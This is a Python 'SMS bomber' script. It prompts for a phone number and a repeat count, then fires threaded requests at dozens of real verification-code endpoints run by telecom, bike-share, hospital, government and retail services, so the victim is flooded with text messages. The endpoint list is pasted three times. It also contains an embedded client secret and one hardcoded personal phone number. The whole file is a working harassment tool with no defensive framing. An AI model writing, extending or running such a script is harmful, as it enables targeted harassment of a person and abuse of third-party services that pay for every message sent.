import requests
from threading import Thread


def get_content(idcard, url):
	try:
		response = requests.get(url)
		response.raise_for_status()  # 检查请求是否成功
		# 在这里处理响应内容并显示
		print(response.text)
	except requests.exceptions.RequestException as e:
		print("请求发生错误：", e)


#
idcard = input("Phone：")

# 定义多个接口
urls = [
	f"https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={idcard}",
	f"https://xcx.wjhr.net/project-xcx/smsController/sendCode2.action?phone={idcard}",
	
	f"https://cyhrsip.bjchy.gov.cn/mobileapi/authorization/oauth2/authorize?client_id=Bitech%5CH5&client_secret=vgkEeveppBwCzPHr&response_type=mobile&username={idcard}",
	
	f"https://lelife-api.axhome.com.cn/user/sendVerify?F=android&phone={idcard}&type=register",
	
	f"https://work.hnrrcz.com/admin/mobile/sendSmsCode/{idcard}",
	
	f"https://client4.uqbike.cn/sms/sendAuthCode.do?accountId=14946&phone={idcard}",
	
	f"https://client5.uqbike.cn/sms/sendAuthCode.do?accountId=500374&phone={idcard}",
	
	f"https://api.huandian.cloud/sms?phone={idcard}&serverKey=qishou",
	
	f"https://core.xiuqiuchuxing.com/client/sms/sendAuthCode.do?accountId=301&phone={idcard}",
	
	f"https://zx.uwenya.cc/new_energy/server/api/web/?r=user/verify-code&appid=wx51cce9a13fc7dbf7&phone={idcard}&token=&v=4.1.2023080601",
	
	f"https://bike.ledear.cn/api/user/code?phone={idcard}&brandAreaId=1279",
	
	f"https://mapi-lx.zjcqkj.com/user/logon/verifyCode/{idcard}",
	
	f"https://api.dycxqc.com/user/logon/verifyCode/{idcard}",
	
	f"https://ess.aofs.vip/api/auth/login/code?mobile={idcard}",
	
	f"https://mupms.ybdeb.com/applet-api/sysUser/sendMsg?phone={idcard}&type=login",
	
	f"https://shark.x.ufans.cn/bapi/sms?mobile={idcard}",
	
	f"https://wechat.hfmlgy.com/wechat/set/{idcard}/QFKJ10001",
	
	f"https://v2.caimomo.com/WeiXinWeb/AjaxHandler.ashx?MethodName=SendSms&GroupID=133135&StoreID=13313501&type=0&Phone={idcard}",
	
	f"https://api.xuribiao.cn/api.php?s=login/get_code&mobile={idcard}",
	
	f"https://client2.uqbike.cn/sms/sendAuthCode.do?accountId=100266&phone={idcard}",
	f"https://huoke.prod.k12.vip/poem/common/sendCode?phone={idcard}&fromType=1",
	f"https://aitob.xiaoyezi.com/student_wx/student/send_sms_code?mobile={idcard}",
	
	f"https://zspt.yonghui.cn:7999/emw/login/getVerifyCode?phone={idcard}&type=1",
	
	f"https://www.miaomaifang.com/v07171//xcx/xcxSms/code?openId=o7vUu5TJtbenW8ryop6BbWR3ltSs&phone={idcard}&province=&city=&agentName=&tell={idcard}&company=",
	
	f"https://xmall.codoon.com/api/mall/webmall/verify_mobile_request?module=mall&mobile={idcard}&area_code=86",
	
	f"https://api.app.bmsgps.com/new_energy/server/api/web/?r=user/verify-code&appid=wxguihewudi&phone={idcard}&token=&v=4.1.2023090502",
	
	f"https://client2.uqbike.cn/sms/sendAuthCode.do?accountId=100797&phone={idcard}",
	
	f"https://client.uqbike.cn/sms/sendAuthCode.do?accountId=290&phone={idcard}",
	
	f"https://douhaapi.douhawangluo.com/user/sendVerificationCode?phoneNumber={idcard}",
	
	f"https://api.ule.com/ylxduser/miniwx/user/sendSmsCode?mobile={idcard}",
	
	f"https://api.xuribiao.cn/api.php?s=login/get_code&mobile={idcard}",
	
	f"https://wxmini.hanyuanyuwen.com/authoCode/get?mobile={idcard}&type=3",
	
	f"https://wccy-server.sxlyb.com/open/v1/login-code/{idcard}?phone={idcard}",
	
	f"https://uc.17win.com/sms/v4/web/verificationCode/send?mobile={idcard}&scene=bind&isVoice=N&appId=08100110010000",
	
	f"https://apis.niuxuezhang.cn/v1/sms-code?phone={idcard}",
	
	f"https://yzq.wochongkeji.com/api/v1/member/verification/code/send?mobilePhone={idcard}&sessionId=MAn6TcMM7GFHddFr9Noenu5XDDvEqlWTuAqIOPdAVsxyw9LgLvzH0rl03RCUDWpq",
	
	f"https://gw.haoxinqing.cn/papi/smsRecord/getCaptchaWeb?smsTempType=appPatientPwd&mobile={idcard}&wxMinType=hxqHospital&openid=&s=9b13db7a3bc9a07ffc81cf21d5463e96",
	
	f"https://wxin.xjjyyy.com/prod-api/member/getSmsVerificationCode?phone=17343387438&codeType=smsCode",
	
	f"https://miniapp.med.gzhc365.com/api/customize/sendMsg?_route=h525&patientMobile={idcard}",
	
	f"https://12345.scncggzy.com.cn/wx/auth/sendVerificationCode.json?mobile={idcard}",
	
	f"https://wzlgbh.wzcc.com/api/wx_applet/sendMsg?mobile={idcard}",
	
	f"https://work.hnrrcz.com/admin/mobile/sendSmsCode/{idcard}",
	
	f"https://zb.renlibao.cn/zhongChuang/sendSms?phoneNumbers={idcard}",
	
	f"https://m-lf.dcdapp.com/passport/web/send_code/?aid=1556&device_id=72970268243&master_aid=&user_unique_id=72970268243&os_version=Windows 10 x64&ma_version=5.10.279&app_name=wechat&data_from=tt_mp&device_platform=windows&device_type=microsoft&device_brand=microsoft&sdk_verison=3.0.2&api_version=2&version_code=0&city_name=郑州&gps_city_name=&type=24&mobile={idcard}",
	
	f"https://mse.digitalvolvo.com/api/2c/c-end-sso-server/api/v3/wxMiniApp/sendSMS.json?phoneNumber=0086{idcard}",
	
	f"https://passport.seagullwatch.com/api/api/v2/auth/customer/login/verify_code?phoneNumber={idcard}",
	
	f"https://www.sysceo.net/api/code/send_code?phone={idcard}",
	
	f"https://ifch.i-cbao.com/hzdevelop/api/user/app/SendCheckCodeHttp?phone={idcard}",
	
	f"https://xxtmcj.lingyueit.com/api/sequence-service/sendCode?mobile={idcard}",
	
	f"https://passport.she.yutfy.cn/api/api/v2/auth/customer/login/verify_code?phoneNumber={idcard}",
	
	f"https://fix.qupingce.com/common/sendCode?phone={idcard}&style=login",
	
	f"https://client.xiaoshachuxing.com/sms/sendAuthCode.do?accountId=100179&phone={idcard}",
	
	f"https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={idcard}",
	
	f"http://user.sanwan.club/push/verificationCode/send?phone={idcard}&useSms=true",
	
	f"https://gxb.sxgp.info/foxcubePhone/doSMSLoginCreateInfo.do?phoneno={idcard}&randomCode=guiheniuibi",
	
	f"https://m.hmlan.com/Weixin/WxOpen/SendMsgCode?userPhone={idcard}",
	
	f"https://api.yizhulife.com/public/send/{idcard}",
	
	f"https://zb.renlibao.cn/zhongChuang/sendSms?phoneNumbers={idcard}",
	
	f"http://cseysasa.sss.cy.a.yesh.fun/api/index/submit?key=a75cce4f352d4d6e2fdf17deca60010b&phone={idcard}&time=12",
	
	f"https://gsy.amr.jiangxi.gov.cn/message/sendCode?mobile={idcard}",
	
	f"https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={idcard}",
	f"https://xcx.wjhr.net/project-xcx/smsController/sendCode2.action?phone={idcard}",
	
	f"https://cyhrsip.bjchy.gov.cn/mobileapi/authorization/oauth2/authorize?client_id=Bitech%5CH5&client_secret=vgkEeveppBwCzPHr&response_type=mobile&username={idcard}",
	
	f"https://lelife-api.axhome.com.cn/user/sendVerify?F=android&phone={idcard}&type=register",
	
	f"https://work.hnrrcz.com/admin/mobile/sendSmsCode/{idcard}",
	
	f"https://client4.uqbike.cn/sms/sendAuthCode.do?accountId=14946&phone={idcard}",
	
	f"https://client5.uqbike.cn/sms/sendAuthCode.do?accountId=500374&phone={idcard}",
	
	f"https://api.huandian.cloud/sms?phone={idcard}&serverKey=qishou",
	
	f"https://core.xiuqiuchuxing.com/client/sms/sendAuthCode.do?accountId=301&phone={idcard}",
	
	f"https://zx.uwenya.cc/new_energy/server/api/web/?r=user/verify-code&appid=wx51cce9a13fc7dbf7&phone={idcard}&token=&v=4.1.2023080601",
	
	f"https://bike.ledear.cn/api/user/code?phone={idcard}&brandAreaId=1279",
	
	f"https://mapi-lx.zjcqkj.com/user/logon/verifyCode/{idcard}",
	
	f"https://api.dycxqc.com/user/logon/verifyCode/{idcard}",
	
	f"https://ess.aofs.vip/api/auth/login/code?mobile={idcard}",
	
	f"https://mupms.ybdeb.com/applet-api/sysUser/sendMsg?phone={idcard}&type=login",
	
	f"https://shark.x.ufans.cn/bapi/sms?mobile={idcard}",
	
	f"https://wechat.hfmlgy.com/wechat/set/{idcard}/QFKJ10001",
	
	f"https://v2.caimomo.com/WeiXinWeb/AjaxHandler.ashx?MethodName=SendSms&GroupID=133135&StoreID=13313501&type=0&Phone={idcard}",
	
	f"https://api.xuribiao.cn/api.php?s=login/get_code&mobile={idcard}",
	
	f"https://client2.uqbike.cn/sms/sendAuthCode.do?accountId=100266&phone={idcard}",
	f"https://huoke.prod.k12.vip/poem/common/sendCode?phone={idcard}&fromType=1",
	f"https://aitob.xiaoyezi.com/student_wx/student/send_sms_code?mobile={idcard}",
	
	f"https://zspt.yonghui.cn:7999/emw/login/getVerifyCode?phone={idcard}&type=1",
	
	f"https://www.miaomaifang.com/v07171//xcx/xcxSms/code?openId=o7vUu5TJtbenW8ryop6BbWR3ltSs&phone={idcard}&province=&city=&agentName=&tell={idcard}&company=",
	
	f"https://xmall.codoon.com/api/mall/webmall/verify_mobile_request?module=mall&mobile={idcard}&area_code=86",
	
	f"https://api.app.bmsgps.com/new_energy/server/api/web/?r=user/verify-code&appid=wxguihewudi&phone={idcard}&token=&v=4.1.2023090502",
	
	f"https://client2.uqbike.cn/sms/sendAuthCode.do?accountId=100797&phone={idcard}",
	
	f"https://client.uqbike.cn/sms/sendAuthCode.do?accountId=290&phone={idcard}",
	
	f"https://douhaapi.douhawangluo.com/user/sendVerificationCode?phoneNumber={idcard}",
	
	f"https://api.ule.com/ylxduser/miniwx/user/sendSmsCode?mobile={idcard}",
	
	f"https://api.xuribiao.cn/api.php?s=login/get_code&mobile={idcard}",
	
	f"https://wxmini.hanyuanyuwen.com/authoCode/get?mobile={idcard}&type=3",
	
	f"https://wccy-server.sxlyb.com/open/v1/login-code/{idcard}?phone={idcard}",
	
	f"https://uc.17win.com/sms/v4/web/verificationCode/send?mobile={idcard}&scene=bind&isVoice=N&appId=08100110010000",
	
	f"https://apis.niuxuezhang.cn/v1/sms-code?phone={idcard}",
	
	f"https://yzq.wochongkeji.com/api/v1/member/verification/code/send?mobilePhone={idcard}&sessionId=MAn6TcMM7GFHddFr9Noenu5XDDvEqlWTuAqIOPdAVsxyw9LgLvzH0rl03RCUDWpq",
	
	f"https://gw.haoxinqing.cn/papi/smsRecord/getCaptchaWeb?smsTempType=appPatientPwd&mobile={idcard}&wxMinType=hxqHospital&openid=&s=9b13db7a3bc9a07ffc81cf21d5463e96",
	
	f"https://wxin.xjjyyy.com/prod-api/member/getSmsVerificationCode?phone=17343387438&codeType=smsCode",
	
	f"https://miniapp.med.gzhc365.com/api/customize/sendMsg?_route=h525&patientMobile={idcard}",
	
	f"https://12345.scncggzy.com.cn/wx/auth/sendVerificationCode.json?mobile={idcard}",
	
	f"https://wzlgbh.wzcc.com/api/wx_applet/sendMsg?mobile={idcard}",
	
	f"https://work.hnrrcz.com/admin/mobile/sendSmsCode/{idcard}",
	
	f"https://zb.renlibao.cn/zhongChuang/sendSms?phoneNumbers={idcard}",
	
	f"https://m-lf.dcdapp.com/passport/web/send_code/?aid=1556&device_id=72970268243&master_aid=&user_unique_id=72970268243&os_version=Windows 10 x64&ma_version=5.10.279&app_name=wechat&data_from=tt_mp&device_platform=windows&device_type=microsoft&device_brand=microsoft&sdk_verison=3.0.2&api_version=2&version_code=0&city_name=郑州&gps_city_name=&type=24&mobile={idcard}",
	
	f"https://mse.digitalvolvo.com/api/2c/c-end-sso-server/api/v3/wxMiniApp/sendSMS.json?phoneNumber=0086{idcard}",
	
	f"https://passport.seagullwatch.com/api/api/v2/auth/customer/login/verify_code?phoneNumber={idcard}",
	
	f"https://www.sysceo.net/api/code/send_code?phone={idcard}",
	
	f"https://ifch.i-cbao.com/hzdevelop/api/user/app/SendCheckCodeHttp?phone={idcard}",
	
	f"https://xxtmcj.lingyueit.com/api/sequence-service/sendCode?mobile={idcard}",
	
	f"https://passport.she.yutfy.cn/api/api/v2/auth/customer/login/verify_code?phoneNumber={idcard}",
	
	f"https://fix.qupingce.com/common/sendCode?phone={idcard}&style=login",
	
	f"https://client.xiaoshachuxing.com/sms/sendAuthCode.do?accountId=100179&phone={idcard}",
	
	f"https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={idcard}",
	
	f"http://user.sanwan.club/push/verificationCode/send?phone={idcard}&useSms=true",
	
	f"https://gxb.sxgp.info/foxcubePhone/doSMSLoginCreateInfo.do?phoneno={idcard}&randomCode=guiheniuibi",
	
	f"https://m.hmlan.com/Weixin/WxOpen/SendMsgCode?userPhone={idcard}",
	
	f"https://api.yizhulife.com/public/send/{idcard}",
	
	f"https://zb.renlibao.cn/zhongChuang/sendSms?phoneNumbers={idcard}",
	
	f"http://cseysasa.sss.cy.a.yesh.fun/api/index/submit?key=a75cce4f352d4d6e2fdf17deca60010b&phone={idcard}&time=12",
	
	f"https://gsy.amr.jiangxi.gov.cn/message/sendCode?mobile={idcard}",
	
	f"https://card.10010.com/ko-order/messageCaptcha/send?phoneVal={idcard}",
	f"https://xcx.wjhr.net/project-xcx/smsController/sendCode2.action?phone={idcard}",
	
	f"https://cyhrsip.bjchy.gov.cn/mobileapi/authorization/oauth2/authorize?client_id=Bitech%5CH5&client_secret=vgkEeveppBwCzPHr&response_type=mobile&username={idcard}",
	
	f"https://lelife-api.axhome.com.cn/user/sendVerify?F=android&phone={idcard}&type=register",
	
	f"https://work.hnrrcz.com/admin/mobile/sendSmsCode/{idcard}",
	
	f"https://client4.uqbike.cn/sms/sendAuthCode.do?accountId=14946&phone={idcard}",
	
	f"https://client5.uqbike.cn/sms/sendAuthCode.do?accountId=500374&phone={idcard}",
	
	f"https://api.huandian.cloud/sms?phone={idcard}&serverKey=qishou",
	
	f"https://core.xiuqiuchuxing.com/client/sms/sendAuthCode.do?accountId=301&phone={idcard}",
	
	f"https://zx.uwenya.cc/new_energy/server/api/web/?r=user/verify-code&appid=wx51cce9a13fc7dbf7&phone={idcard}&token=&v=4.1.2023080601",
	
	f"https://bike.ledear.cn/api/user/code?phone={idcard}&brandAreaId=1279",
	
	f"https://mapi-lx.zjcqkj.com/user/logon/verifyCode/{idcard}",
	
	f"https://api.dycxqc.com/user/logon/verifyCode/{idcard}",
	
	f"https://ess.aofs.vip/api/auth/login/code?mobile={idcard}",
	
	f"https://mupms.ybdeb.com/applet-api/sysUser/sendMsg?phone={idcard}&type=login",
	
	f"https://shark.x.ufans.cn/bapi/sms?mobile={idcard}",
	
	f"https://wechat.hfmlgy.com/wechat/set/{idcard}/QFKJ10001",
	
	f"https://v2.caimomo.com/WeiXinWeb/AjaxHandler.ashx?MethodName=SendSms&GroupID=133135&StoreID=13313501&type=0&Phone={idcard}",
	
	f"https://api.xuribiao.cn/api.php?s=login/get_code&mobile={idcard}",
	
	f"https://client2.uqbike.cn/sms/sendAuthCode.do?accountId=100266&phone={idcard}",
	f"https://huoke.prod.k12.vip/poem/common/sendCode?phone={idcard}&fromType=1",
	f"https://aitob.xiaoyezi.com/student_wx/student/send_sms_code?mobile={idcard}",
	
	f"https://zspt.yonghui.cn:7999/emw/login/getVerifyCode?phone={idcard}&type=1",
	
	f"https://www.miaomaifang.com/v07171//xcx/xcxSms/code?openId=o7vUu5TJtbenW8ryop6BbWR3ltSs&phone={idcard}&province=&city=&agentName=&tell={idcard}&company=",
	
	f"https://xmall.codoon.com/api/mall/webmall/verify_mobile_request?module=mall&mobile={idcard}&area_code=86",
	
	f"https://api.app.bmsgps.com/new_energy/server/api/web/?r=user/verify-code&appid=wxguihewudi&phone={idcard}&token=&v=4.1.2023090502",
	
	f"https://client2.uqbike.cn/sms/sendAuthCode.do?accountId=100797&phone={idcard}",
	
	f"https://client.uqbike.cn/sms/sendAuthCode.do?accountId=290&phone={idcard}",
	
	f"https://douhaapi.douhawangluo.com/user/sendVerificationCode?phoneNumber={idcard}",
	
	f"https://api.ule.com/ylxduser/miniwx/user/sendSmsCode?mobile={idcard}",
	
	f"https://api.xuribiao.cn/api.php?s=login/get_code&mobile={idcard}",
	
	f"https://wxmini.hanyuanyuwen.com/authoCode/get?mobile={idcard}&type=3",
	
	f"https://wccy-server.sxlyb.com/open/v1/login-code/{idcard}?phone={idcard}",
	
	f"https://uc.17win.com/sms/v4/web/verificationCode/send?mobile={idcard}&scene=bind&isVoice=N&appId=08100110010000",
	
	f"https://apis.niuxuezhang.cn/v1/sms-code?phone={idcard}",
	
	f"https://yzq.wochongkeji.com/api/v1/member/verification/code/send?mobilePhone={idcard}&sessionId=MAn6TcMM7GFHddFr9Noenu5XDDvEqlWTuAqIOPdAVsxyw9LgLvzH0rl03RCUDWpq",
	
	f"https://gw.haoxinqing.cn/papi/smsRecord/getCaptchaWeb?smsTempType=appPatientPwd&mobile={idcard}&wxMinType=hxqHospital&openid=&s=9b13db7a3bc9a07ffc81cf21d5463e96",
	
	f"https://wxin.xjjyyy.com/prod-api/member/getSmsVerificationCode?phone=17343387438&codeType=smsCode",
	
	f"https://miniapp.med.gzhc365.com/api/customize/sendMsg?_route=h525&patientMobile={idcard}",
	
	f"https://12345.scncggzy.com.cn/wx/auth/sendVerificationCode.json?mobile={idcard}",
	
	f"https://wzlgbh.wzcc.com/api/wx_applet/sendMsg?mobile={idcard}",
	
	f"https://work.hnrrcz.com/admin/mobile/sendSmsCode/{idcard}",
	
	f"https://zb.renlibao.cn/zhongChuang/sendSms?phoneNumbers={idcard}",
	
	f"https://m-lf.dcdapp.com/passport/web/send_code/?aid=1556&device_id=72970268243&master_aid=&user_unique_id=72970268243&os_version=Windows 10 x64&ma_version=5.10.279&app_name=wechat&data_from=tt_mp&device_platform=windows&device_type=microsoft&device_brand=microsoft&sdk_verison=3.0.2&api_version=2&version_code=0&city_name=郑州&gps_city_name=&type=24&mobile={idcard}",
	
	f"https://mse.digitalvolvo.com/api/2c/c-end-sso-server/api/v3/wxMiniApp/sendSMS.json?phoneNumber=0086{idcard}",
	
	f"https://passport.seagullwatch.com/api/api/v2/auth/customer/login/verify_code?phoneNumber={idcard}",
	
	f"https://www.sysceo.net/api/code/send_code?phone={idcard}",
	
	f"https://ifch.i-cbao.com/hzdevelop/api/user/app/SendCheckCodeHttp?phone={idcard}",
	
	f"https://xxtmcj.lingyueit.com/api/sequence-service/sendCode?mobile={idcard}",
	
	f"https://passport.she.yutfy.cn/api/api/v2/auth/customer/login/verify_code?phoneNumber={idcard}",
	
	f"https://fix.qupingce.com/common/sendCode?phone={idcard}&style=login",
	
	f"https://client.xiaoshachuxing.com/sms/sendAuthCode.do?accountId=100179&phone={idcard}",
	
	f"https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={idcard}",
	
	f"http://user.sanwan.club/push/verificationCode/send?phone={idcard}&useSms=true",
	
	f"https://gxb.sxgp.info/foxcubePhone/doSMSLoginCreateInfo.do?phoneno={idcard}&randomCode=guiheniuibi",
	
	f"https://m.hmlan.com/Weixin/WxOpen/SendMsgCode?userPhone={idcard}",
	
	f"https://api.yizhulife.com/public/send/{idcard}",
	
	f"https://zb.renlibao.cn/zhongChuang/sendSms?phoneNumbers={idcard}",
	
	f"http://cseysasa.sss.cy.a.yesh.fun/api/index/submit?key=a75cce4f352d4d6e2fdf17deca60010b&phone={idcard}&time=12",
	
	f"https://gsy.amr.jiangxi.gov.cn/message/sendCode?mobile={idcard}",
	# 添加更多接口
]

# 计算接口数量
url_count = len(urls)
print(f"预计轰炸{url_count}个短信")

# 获取用户输入的循环次数
loop_times = int(input("请输入循环次数："))

# 循环调用每个接口
for i in range(loop_times):
	for j, url in enumerate(urls):
		t = Thread(target=get_content, args=(idcard, url))
		t.start()
		t.join()
		print(f"第{j + 1}个接口调用成功")
# 运行完的提示文本